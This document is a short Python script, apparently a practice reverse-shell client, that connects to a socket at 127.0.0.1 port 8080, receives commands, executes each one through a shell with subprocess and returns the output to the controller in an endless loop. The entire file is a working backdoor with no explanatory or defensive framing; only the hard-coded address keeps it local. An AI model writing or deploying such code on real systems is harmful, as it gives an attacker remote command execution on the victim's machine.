import subprocess
import socket
ip_address="127.0.0.1"
port=8080
client=socket.socket()
print("initiating process")
client.connect((ip_address,port))
print("connection intitated")
while True:
    print("[-] wainting for commands")
    command=client.recv(1024)
    command= command.decode()
    op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    output_error=op.stderr.read()
    output=op.stdout.read()
    print("sending response")
    client.send(output+output_error)
    
    
    